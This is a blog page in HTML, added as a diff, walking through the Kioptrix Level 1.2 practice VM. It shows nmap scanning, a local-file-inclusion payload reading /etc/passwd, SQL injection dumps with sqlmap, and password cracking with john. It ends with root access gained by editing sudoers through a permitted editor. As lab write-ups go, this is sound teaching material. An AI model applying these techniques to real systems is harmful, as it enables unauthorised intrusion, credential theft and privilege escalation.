@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Kioptrix Level 1.2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-23">January 23, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/kioptrix">kioptrix</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Kioptrix Level 1.2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthough of how I completed the Kioptrix Level 1.2.  The goal of this challenge is to collect the flag.</p>
+
+<h2 id="nmap:dfc41ddb0541bee9ee434872f5cc4efd">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- kioptrix3.com
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Ligoat Security - Got Goat? Security ...
+</code></pre>
+
+<h2 id="lotuscms:dfc41ddb0541bee9ee434872f5cc4efd">LotusCMS</h2>
+
+<p>This little website is powered by LotusCMS, which is vulnerable to remote code execution.  However, I wasn&rsquo;t having much luck with anything other than the exploit in the Metasploit Framework.  Since I don&rsquo;t like to rely on this, I pressed on to find another route in.</p>
+
+<p>LotusCMS also has an LFI vulnerability, which I used to enumerate a list of users on the system (via <code>/etc/passwd</code>).</p>
+
+<pre><code class="language-text">http://kioptrix3.com/index.php?system=../../../../../etc/passwd%00.html
+loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+</code></pre>
+
+<p>I actually decided to hold off on bruteforcing their SSH logins.  It was my assumption that at this level of challenge, the password would be too complex to bruteforce in a reasonable amount of time.</p>
+
+<h2 id="gallery:dfc41ddb0541bee9ee434872f5cc4efd">Gallery</h2>
+
+<p>One of the blog posts referes to a new gallery application at kioptrix3.com/gallery.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/kioptrix-1-2/gallerific.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>A review of the page&rsquo;s source code, reveals an HTML comment which shows the location of the admin login page - /gallery/gadmin.  This login page tells us that the application is called Gallarrific, which is vulnerable to SQLi in gallery.php.</p>
+
+<p><code>kioptrix3.com/gallery/gallery.php?id=</code></p>
+
+<h2 id="sqlmap:dfc41ddb0541bee9ee434872f5cc4efd">SQLMap</h2>
+
+<p>I plugged the URL into SQLMap and it confirmed the vulnerability.</p>
+
+<pre><code class="language-text">root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null --current-user --is-dba --current-db
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL 5.0
+current user:    'root@localhost'
+current database:    'gallery'
+current user is DBA:    True
+
+root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery --tables
++----------------------+
+| dev_accounts         |
+| gallarific_comments  |
+| gallarific_galleries |
+| gallarific_photos    |
+| gallarific_settings  |
+| gallarific_stats     |
+| gallarific_users     |
++----------------------+
+
+root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery -T dev_accounts --dump
+</code></pre>
+
+<p>I saved these hashes and cracked them with john.</p>
+
+<pre><code class="language-text">root@kali:~# john /tmp/sqlmaphashes-eOPcIU.txt --format=raw-md5
+starwars         (loneferret)
+Mast3r           (dreg)
+</code></pre>
+
+<p>I also dumped the password for the admin account on gallarific.</p>
+
+<pre><code class="language-text">root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery -T gallarific_users --dump
+admin:n0t7t1k4
+</code></pre>
+
+<p>My original intent was to use the admin password for Gallarific and attempt to upload a PHP backdoor.  However, I first decided to try the two passwords from the dev_accounts with SSH.</p>
+
+<h2 id="ssh:dfc41ddb0541bee9ee434872f5cc4efd">SSH</h2>
+
+<p>I was able to login as <code>loneferret</code> with the password <code>starwars</code> (blew my original SSH theory out of the water).</p>
+
+<p>Within loneferret&rsquo;s home directory was a file called <code>CompanyPolicy.README</code>.</p>
+
+<pre><code class="language-text">loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+</code></pre>
+
+<p>I confirmed that loneferret had the rights to run ht with sudo.</p>
+
+<pre><code class="language-text">loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+</code></pre>
+
+<p>The obvious solution is to modify the sudoers file, to give loneferret sudo right to <code>/bin/bash</code>.</p>
+
+<p><code>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash</code></p>
+
+<pre><code class="language-text">loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+    (root) NOPASSWD: /bin/bash
+    
+loneferret@Kioptrix3:~$ sudo /bin/bash 
+
+root@Kioptrix3:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
